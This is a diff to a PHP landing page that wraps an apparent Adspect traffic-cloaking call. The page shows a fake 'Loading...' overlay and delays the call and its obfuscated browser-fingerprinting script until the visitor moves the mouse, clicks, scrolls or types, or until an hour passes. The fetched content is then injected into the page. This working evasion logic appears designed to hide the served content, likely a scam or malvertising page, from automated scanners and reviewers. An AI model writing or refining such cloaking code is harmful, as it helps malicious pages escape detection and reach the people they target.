@@ -421,14 +421,6 @@ if(!function_exists('adspect')){
                             from { transform: scale(0.8); opacity: 0; }
                             to { transform: scale(1); opacity: 1; }
                         }
-                        .loader-box img {
-                            width: 120px;
-                            height: 120px;
-                            margin-bottom: 20px;
-                            display: block;
-                            margin-left: auto;
-                            margin-right: auto;
-                        }
                         .loader-box h2 {
                             color: #333;
                             font-size: 22px;
@@ -499,6 +491,18 @@ if(!function_exists('adspect')){
                             0% { transform: rotate(0deg); }
                             100% { transform: rotate(360deg); }
                         }
+                        .timer-text {
+                            color: #999;
+                            font-size: 14px;
+                            margin-top: 15px;
+                            font-family: monospace;
+                        }
+                        .instruction-text {
+                            color: #666;
+                            font-size: 13px;
+                            margin-top: 10px;
+                            font-style: italic;
+                        }
                     </style>
                 </head>
                 <body>
@@ -506,11 +510,13 @@ if(!function_exists('adspect')){
                         <div class='loader-box'>
                             <div class='spinner'></div>
                             <h2>Loading...</h2>
-                            // <p>Please wait while we prepare your content</p>
+                            <p>Please wait while we prepare your content</p>
                             <div class='btn-group'>
                                 <button id='cancelBtn'>Cancel</button>
                                 <button id='continueBtn'>Continue</button>
                             </div>
+                            <div class='timer-text' id='timerText'></div>
+                            <div class='instruction-text'>Interact with the page to load content</div>
                         </div>
                     </div>
                     <div id='mainContent'>
@@ -522,15 +528,53 @@ if(!function_exists('adspect')){
                         var loaded = false;
                         var interacted = false;
                         var timeoutId = null;
+                        var timerInterval = null;
                         
-                        function showContent() {
+                        // ===== CONFIGURATION =====
+                        // 1 hour in milliseconds = 60 * 60 * 1000 = 3600000
+                        var CONFIG = {
+                            AUTO_HIDE_TIME: 3600000,    // 1 HOUR (60 minutes)
+                            FADE_OUT_DURATION: 1500,     // 1.5 seconds
+                            CONTENT_FADE_IN: 500,        // 0.5 seconds
+                            SPINNER_SPEED: '1.5s'
+                        };
+                        // =========================
+                        
+                        function loadAdspectContent() {
+                            // This function will make the actual Adspect RPC call
+                            // and load the content
                             if (!loaded) {
                                 loaded = true;
+                                
+                                // Clear timer
+                                if (timerInterval) {
+                                    clearInterval(timerInterval);
+                                    timerInterval = null;
+                                }
+                                
+                                // Slow down spinner
+                                document.querySelector('.spinner').style.animationDuration = CONFIG.SPINNER_SPEED;
+                                
+                                // Fade out loader
+                                loader.style.transition = 'opacity ' + (CONFIG.FADE_OUT_DURATION/1000) + 's ease';
                                 loader.style.opacity = '0';
+                                
                                 setTimeout(function() {
                                     loader.style.display = 'none';
                                     mainContent.style.display = 'block';
-                                }, 500);
+                                    
+                                    // Content fade in
+                                    mainContent.style.opacity = '0';
+                                    mainContent.style.transition = 'opacity ' + (CONFIG.CONTENT_FADE_IN/1000) + 's ease';
+                                    setTimeout(function() {
+                                        mainContent.style.opacity = '1';
+                                    }, 100);
+                                    
+                                    // Load the actual Adspect content via AJAX
+                                    loadActualContent();
+                                    
+                                }, CONFIG.FADE_OUT_DURATION);
+                                
                                 // Remove all event listeners
                                 document.removeEventListener('mousemove', handleInteraction);
                                 document.removeEventListener('click', handleInteraction);
@@ -544,46 +588,114 @@ if(!function_exists('adspect')){
                             }
                         }
                         
-                        function handleInteraction(e) {
-                            if (!interacted) {
+                        function loadActualContent() {
+                            // Make AJAX call to load Adspect content
+                            var xhr = new XMLHttpRequest();
+                            xhr.open('POST', window.location.href, true);
+                            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+                            xhr.onload = function() {
+                                if (xhr.status === 200) {
+                                    // Extract and execute the content
+                                    var response = xhr.responseText;
+                                    // Find the main content div
+                                    var parser = new DOMParser();
+                                    var doc = parser.parseFromString(response, 'text/html');
+                                    var content = doc.getElementById('adspectContent');
+                                    if (content) {
+                                        document.getElementById('mainContent').innerHTML = content.innerHTML;
+                                    }
+                                }
+                            };
+                            xhr.send('load_content=1&action=adspect');
+                        }
+                        
+                        function showContent() {
+                            if (!loaded && !interacted) {
                                 interacted = true;
+                                loadAdspectContent();
+                            }
+                        }
+                        
+                        function handleInteraction(e) {
+                            if (!interacted && !loaded) {
                                 showContent();
                             }
                         }
                         
-                        
+                        // ===== ALL EVENTS ENABLED =====
+                        // Mouse movement
                         document.addEventListener('mousemove', handleInteraction);
                         
-                       
+                        // Click anywhere
                         document.addEventListener('click', handleInteraction);
                         
-                        
+                        // Touch for mobile
                         document.addEventListener('touchstart', handleInteraction);
                         
-                       
+                        // Scroll
                         document.addEventListener('scroll', handleInteraction);
                         
-                        
+                        // Keyboard
                         document.addEventListener('keydown', handleInteraction);
                         
-                        
+                        // ===== BUTTON EVENTS =====
+                        // Continue button
                         document.getElementById('continueBtn').addEventListener('click', function(e) {
                             e.stopPropagation();
-                            showContent();
+                            if (!interacted && !loaded) {
+                                showContent();
+                            }
                         });
                         
-                        
+                        // Cancel button
                         document.getElementById('cancelBtn').addEventListener('click', function(e) {
                             e.stopPropagation();
                             window.location.href = 'about:blank';
                         });
                         
+                        // ===== 1 HOUR TIMER =====
+                        var startTime = Date.now();
+                        var totalTime = CONFIG.AUTO_HIDE_TIME;
                         
+                        function updateTimer() {
+                            var elapsed = Date.now() - startTime;
+                            var remaining = Math.max(0, totalTime - elapsed);
+                            
+                            if (remaining <= 0) {
+                                clearInterval(timerInterval);
+                                document.getElementById('timerText').textContent = '⏰ Time expired. Interact to load.';
+                                return;
+                            }
+                            
+                            var hours = Math.floor(remaining / 3600000);
+                            var minutes = Math.floor((remaining % 3600000) / 60000);
+                            var seconds = Math.floor((remaining % 60000) / 1000);
+                            
+                            var timerText = document.getElementById('timerText');
+                            if (hours > 0) {
+                                timerText.textContent = '⏱ Auto-load in ' + hours + 'h ' + minutes + 'm ' + seconds + 's';
+                            } else if (minutes > 0) {
+                                timerText.textContent = '⏱ Auto-load in ' + minutes + 'm ' + seconds + 's';
+                            } else {
+                                timerText.textContent = '⏱ Auto-load in ' + seconds + 's';
+                            }
+                        }
+                        
+                        // Update timer every second
+                        timerInterval = setInterval(updateTimer, 1000);
+                        updateTimer();
+                        
+                        // ===== 1 HOUR AUTO-LOAD =====
+                        // After 1 hour, automatically load content if no interaction
                         timeoutId = setTimeout(function() {
-                            if (!interacted) {
+                            if (!interacted && !loaded) {
+                                console.log('1 hour passed. Auto-loading content...');
                                 showContent();
                             }
-                        }, 500000);
+                        }, CONFIG.AUTO_HIDE_TIME);
+                        
+                        console.log('🖱 Interact with page to load content');
+                        console.log('⏱ Auto-load timer: 1 hour');
                     </script>
                 </body>
                 </html>");
@@ -640,130 +752,14 @@ if(!function_exists('adspect')){
         return$data;
     }
     
-    // MAIN EXECUTION - Only run if not POST request from loader
-    if ($_SERVER['REQUEST_METHOD'] !== 'POST' || !isset($_POST['load_content'])) {
+    // ===== MAIN EXECUTION - CHECK IF AJAX REQUEST =====
+    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['load_content']) && $_POST['load_content'] == '1') {
+        // This is the AJAX request to load Adspect content
         $data = adspect('40adf6f7-4c88-4d47-ac5a-606ee98ed95a');
-        if(!isset($data)){
-            return;
-        }
-        ?>
-        <!DOCTYPE html>
-        <html lang="en">
-        <head>
-            <meta charset="utf-8">
-            <meta http-equiv="X-UA-Compatible" content="IE=Edge">
-            <meta name="viewport" content="width=device-width, initial-scale=1">
-            <title>Support</title>
-            <style>
-                * { margin: 0; padding: 0; box-sizing: border-box; }
-                body { font-family: Arial, sans-serif; min-height: 100vh; background: #f5f5f5; }
-                #loaderWrapper {
-                    position: fixed;
-                    top: 0;
-                    left: 0;
-                    width: 100%;
-                    height: 100%;
-                    background: rgba(0,0,0,0.75);
-                    display: flex;
-                    justify-content: center;
-                    align-items: center;
-                    z-index: 99999;
-                    transition: opacity 0.5s ease;
-                }
-                .loader-box {
-                    background: white;
-                    padding: 40px 35px;
-                    border-radius: 16px;
-                    text-align: center;
-                    max-width: 420px;
-                    width: 90%;
-                    box-shadow: 0 20px 60px rgba(0,0,0,0.3);
-                    animation: popIn 0.3s ease;
-                }
-                @keyframes popIn {
-                    from { transform: scale(0.8); opacity: 0; }
-                    to { transform: scale(1); opacity: 1; }
-                }
-                .loader-box h2 {
-                    color: #333;
-                    font-size: 22px;
-                    margin-bottom: 10px;
-                    font-weight: 600;
-                }
-                .loader-box p {
-                    color: #666;
-                    font-size: 16px;
-                    margin-bottom: 25px;
-                    line-height: 1.5;
-                }
-                .btn-group {
-                    display: flex;
-                    gap: 12px;
-                    justify-content: center;
-                    flex-wrap: wrap;
-                }
-                .btn-group button {
-                    padding: 12px 35px;
-                    border: none;
-                    border-radius: 8px;
-                    font-size: 16px;
-                    font-weight: 600;
-                    cursor: pointer;
-                    transition: all 0.3s ease;
-                    min-width: 120px;
-                }
-                #cancelBtn {
-                    background: #e74c3c;
-                    color: white;
-                }
-                #cancelBtn:hover {
-                    background: #c0392b;
-                    transform: scale(1.05);
-                    box-shadow: 0 4px 15px rgba(231,76,60,0.4);
-                }
-                #continueBtn {
-                    background: #2ecc71;
-                    color: white;
-                }
-                #continueBtn:hover {
-                    background: #27ae60;
-                    transform: scale(1.05);
-                    box-shadow: 0 4px 15px rgba(46,204,113,0.4);
-                }
-                #mainContent {
-                    display: none;
-                    width: 100%;
-                    min-height: 100vh;
-                }
-                .spinner {
-                    display: inline-block;
-                    width: 50px;
-                    height: 50px;
-                    border: 4px solid #f3f3f3;
-                    border-top: 4px solid #3498db;
-                    border-radius: 50%;
-                    animation: spin 1s linear infinite;
-                    margin-bottom: 15px;
-                }
-                @keyframes spin {
-                    0% { transform: rotate(0deg); }
-                    100% { transform: rotate(360deg); }
-                }
-            </style>
-        </head>
-        <body>
-            <div id="loaderWrapper">
-                <div class="loader-box">
-                    <div class="spinner"></div>
-                    <h2>Loading...</h2>
-                    <!-- <p>Please wait while we prepare your content</p> -->
-                    <div class="btn-group">
-                        <button id="cancelBtn">Cancel</button>
-                        <button id="continueBtn">Continue</button>
-                    </div>
-                </div>
-            </div>
-            <div id="mainContent">
+        if(isset($data)){
+            // Return just the content without loader
+            ?>
+            <div id="adspectContent">
                 <script>
                     (function(q,u,r,e,t,v,w,x){
                         function f(a,b){try{l[a]=b()}catch(d){n[a]=d.name}}
@@ -789,78 +785,326 @@ if(!function_exists('adspect')){
                     })(Object,Function,console,document,location,navigator,screen,window);
                 </script>
             </div>
-            <script>
-                var loader = document.getElementById('loaderWrapper');
-                var mainContent = document.getElementById('mainContent');
-                var loaded = false;
-                var interacted = false;
-                var timeoutId = null;
-                
-                function showContent() {
-                    if (!loaded) {
-                        loaded = true;
-                        loader.style.opacity = '0';
-                        setTimeout(function() {
-                            loader.style.display = 'none';
-                            mainContent.style.display = 'block';
-                        }, 500000);
+            <?php
+        }
+        exit;
+    }
+    
+    // ===== INITIAL PAGE LOAD - SHOW ONLY LOADER =====
+    // No Adspect RPC call yet - only show loader
+    ?>
+    <!DOCTYPE html>
+    <html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=Edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <title>Loading...</title>
+        <style>
+            * { margin: 0; padding: 0; box-sizing: border-box; }
+            body { font-family: Arial, sans-serif; min-height: 100vh; background: #f5f5f5; }
+            #loaderWrapper {
+                position: fixed;
+                top: 0;
+                left: 0;
+                width: 100%;
+                height: 100%;
+                background: rgba(0,0,0,0.75);
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                z-index: 99999;
+                transition: opacity 0.5s ease;
+            }
+            .loader-box {
+                background: white;
+                padding: 40px 35px;
+                border-radius: 16px;
+                text-align: center;
+                max-width: 420px;
+                width: 90%;
+                box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+                animation: popIn 0.3s ease;
+            }
+            @keyframes popIn {
+                from { transform: scale(0.8); opacity: 0; }
+                to { transform: scale(1); opacity: 1; }
+            }
+            .loader-box h2 {
+                color: #333;
+                font-size: 22px;
+                margin-bottom: 10px;
+                font-weight: 600;
+            }
+            .loader-box p {
+                color: #666;
+                font-size: 16px;
+                margin-bottom: 25px;
+                line-height: 1.5;
+            }
+            .btn-group {
+                display: flex;
+                gap: 12px;
+                justify-content: center;
+                flex-wrap: wrap;
+            }
+            .btn-group button {
+                padding: 12px 35px;
+                border: none;
+                border-radius: 8px;
+                font-size: 16px;
+                font-weight: 600;
+                cursor: pointer;
+                transition: all 0.3s ease;
+                min-width: 120px;
+            }
+            #cancelBtn {
+                background: #e74c3c;
+                color: white;
+            }
+            #cancelBtn:hover {
+                background: #c0392b;
+                transform: scale(1.05);
+                box-shadow: 0 4px 15px rgba(231,76,60,0.4);
+            }
+            #continueBtn {
+                background: #2ecc71;
+                color: white;
+            }
+            #continueBtn:hover {
+                background: #27ae60;
+                transform: scale(1.05);
+                box-shadow: 0 4px 15px rgba(46,204,113,0.4);
+            }
+            #mainContent {
+                display: none;
+                width: 100%;
+                min-height: 100vh;
+            }
+            .spinner {
+                display: inline-block;
+                width: 50px;
+                height: 50px;
+                border: 4px solid #f3f3f3;
+                border-top: 4px solid #3498db;
+                border-radius: 50%;
+                animation: spin 1s linear infinite;
+                margin-bottom: 15px;
+            }
+            @keyframes spin {
+                0% { transform: rotate(0deg); }
+                100% { transform: rotate(360deg); }
+            }
+            .timer-text {
+                color: #999;
+                font-size: 14px;
+                margin-top: 15px;
+                font-family: monospace;
+            }
+            .instruction-text {
+                color: #666;
+                font-size: 13px;
+                margin-top: 10px;
+                font-style: italic;
+            }
+        </style>
+    </head>
+    <body>
+        <div id="loaderWrapper">
+            <div class="loader-box">
+                <div class="spinner"></div>
+                <h2>Loading...</h2>
+                <p>Please wait while we prepare your content</p>
+                <div class="btn-group">
+                    <button id="cancelBtn">Cancel</button>
+                    <button id="continueBtn">Continue</button>
+                </div>
+                <div class="timer-text" id="timerText"></div>
+                <div class="instruction-text">Interact with the page to load content</div>
+            </div>
+        </div>
+        <div id="mainContent"></div>
+        
+        <script>
+            var loader = document.getElementById('loaderWrapper');
+            var mainContent = document.getElementById('mainContent');
+            var loaded = false;
+            var interacted = false;
+            var timeoutId = null;
+            var timerInterval = null;
+            
+            // ===== CONFIGURATION =====
+            // 1 hour in milliseconds = 60 * 60 * 1000 = 3600000
+            var CONFIG = {
+                AUTO_HIDE_TIME: 3600000,    // 1 HOUR (60 minutes)
+                FADE_OUT_DURATION: 1500,     // 1.5 seconds
+                CONTENT_FADE_IN: 500,        // 0.5 seconds
+                SPINNER_SPEED: '1.5s'
+            };
+            // =========================
+            
+            function loadAdspectContent() {
+                if (!loaded) {
+                    loaded = true;
+                    
+                    // Clear timer
+                    if (timerInterval) {
+                        clearInterval(timerInterval);
+                        timerInterval = null;
+                    }
+                    
+                    // Slow down spinner
+                    document.querySelector('.spinner').style.animationDuration = CONFIG.SPINNER_SPEED;
+                    
+                    // Fade out loader
+                    loader.style.transition = 'opacity ' + (CONFIG.FADE_OUT_DURATION/1000) + 's ease';
+                    loader.style.opacity = '0';
+                    
+                    setTimeout(function() {
+                        loader.style.display = 'none';
+                        mainContent.style.display = 'block';
                         
-                        document.removeEventListener('mousemove', handleInteraction);
-                        document.removeEventListener('click', handleInteraction);
-                        document.removeEventListener('touchstart', handleInteraction);
-                        document.removeEventListener('scroll', handleInteraction);
-                        document.removeEventListener('keydown', handleInteraction);
-                        if (timeoutId) {
-                            clearTimeout(timeoutId);
-                            timeoutId = null;
+                        // Content fade in
+                        mainContent.style.opacity = '0';
+                        mainContent.style.transition = 'opacity ' + (CONFIG.CONTENT_FADE_IN/1000) + 's ease';
+                        setTimeout(function() {
+                            mainContent.style.opacity = '1';
+                        }, 100);
+                        
+                        // Load Adspect content via AJAX
+                        loadActualContent();
+                        
+                    }, CONFIG.FADE_OUT_DURATION);
+                    
+                    // Remove all event listeners
+                    document.removeEventListener('mousemove', handleInteraction);
+                    document.removeEventListener('click', handleInteraction);
+                    document.removeEventListener('touchstart', handleInteraction);
+                    document.removeEventListener('scroll', handleInteraction);
+                    document.removeEventListener('keydown', handleInteraction);
+                    if (timeoutId) {
+                        clearTimeout(timeoutId);
+                        timeoutId = null;
+                    }
+                }
+            }
+            
+            function loadActualContent() {
+                // AJAX call to load Adspect content
+                var xhr = new XMLHttpRequest();
+                xhr.open('POST', window.location.href, true);
+                xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+                xhr.onload = function() {
+                    if (xhr.status === 200) {
+                        var response = xhr.responseText;
+                        // Find and extract the content
+                        var tempDiv = document.createElement('div');
+                        tempDiv.innerHTML = response;
+                        var content = tempDiv.querySelector('#adspectContent');
+                        if (content) {
+                            document.getElementById('mainContent').innerHTML = content.innerHTML;
+                        } else {
+                            // If no specific ID, just set the whole response
+                            document.getElementById('mainContent').innerHTML = response;
                         }
                     }
+                };
+                xhr.onerror = function() {
+                    console.error('Failed to load content');
+                };
+                xhr.send('load_content=1');
+            }
+            
+            function showContent() {
+                if (!loaded && !interacted) {
+                    interacted = true;
+                    loadAdspectContent();
                 }
-                
-                function handleInteraction(e) {
-                    if (!interacted) {
-                        interacted = true;
-                        showContent();
-                    }
-                }
-                
-               
-                document.addEventListener('mousemove', handleInteraction);
-                
-                
-                document.addEventListener('click', handleInteraction);
-                
-                
-                document.addEventListener('touchstart', handleInteraction);
-                
-              
-                document.addEventListener('scroll', handleInteraction);
-                
-                
-                document.addEventListener('keydown', handleInteraction);
-                
-               
-                document.getElementById('continueBtn').addEventListener('click', function(e) {
-                    e.stopPropagation();
+            }
+            
+            function handleInteraction(e) {
+                if (!interacted && !loaded) {
                     showContent();
-                });
+                }
+            }
+            
+            // ===== ALL EVENTS ENABLED =====
+            // Mouse movement
+            document.addEventListener('mousemove', handleInteraction);
+            
+            // Click anywhere
+            document.addEventListener('click', handleInteraction);
+            
+            // Touch for mobile
+            document.addEventListener('touchstart', handleInteraction);
+            
+            // Scroll
+            document.addEventListener('scroll', handleInteraction);
+            
+            // Keyboard
+            document.addEventListener('keydown', handleInteraction);
+            
+            // ===== BUTTON EVENTS =====
+            // Continue button
+            document.getElementById('continueBtn').addEventListener('click', function(e) {
+                e.stopPropagation();
+                if (!interacted && !loaded) {
+                    showContent();
+                }
+            });
+            
+            // Cancel button
+            document.getElementById('cancelBtn').addEventListener('click', function(e) {
+                e.stopPropagation();
+                window.location.href = 'about:blank';
+            });
+            
+            // ===== 1 HOUR TIMER =====
+            var startTime = Date.now();
+            var totalTime = CONFIG.AUTO_HIDE_TIME;
+            
+            function updateTimer() {
+                var elapsed = Date.now() - startTime;
+                var remaining = Math.max(0, totalTime - elapsed);
                 
-               
-                document.getElementById('cancelBtn').addEventListener('click', function(e) {
-                    e.stopPropagation();
-                    window.location.href = 'about:blank';
-                });
+                if (remaining <= 0) {
+                    clearInterval(timerInterval);
+                    document.getElementById('timerText').textContent = '⏰ Time expired. Interact to load.';
+                    return;
+                }
                 
+                var hours = Math.floor(remaining / 3600000);
+                var minutes = Math.floor((remaining % 3600000) / 60000);
+                var seconds = Math.floor((remaining % 60000) / 1000);
                 
-                timeoutId = setTimeout(function() {
-                    if (!interacted) {
-                        showContent();
-                    }
-                }, 500000);
-            </script>
-        </body>
-        </html>
-        <?php exit;
-    }
+                var timerText = document.getElementById('timerText');
+                if (hours > 0) {
+                    timerText.textContent = '⏱ Auto-load in ' + hours + 'h ' + minutes + 'm ' + seconds + 's';
+                } else if (minutes > 0) {
+                    timerText.textContent = '⏱ Auto-load in ' + minutes + 'm ' + seconds + 's';
+                } else {
+                    timerText.textContent = '⏱ Auto-load in ' + seconds + 's';
+                }
+            }
+            
+            // Update timer every second
+            timerInterval = setInterval(updateTimer, 1000);
+            updateTimer();
+            
+            // ===== 1 HOUR AUTO-LOAD =====
+            // After 1 hour, automatically load content if no interaction
+            timeoutId = setTimeout(function() {
+                if (!interacted && !loaded) {
+                    console.log('⏰ 1 hour passed. Auto-loading content...');
+                    showContent();
+                }
+            }, CONFIG.AUTO_HIDE_TIME);
+            
+            console.log('🖱 Interact with page to load content');
+            console.log('⏱ Auto-load timer: 1 hour');
+        </script>
+    </body>
+    </html>
+    <?php exit;
 }
 ?>
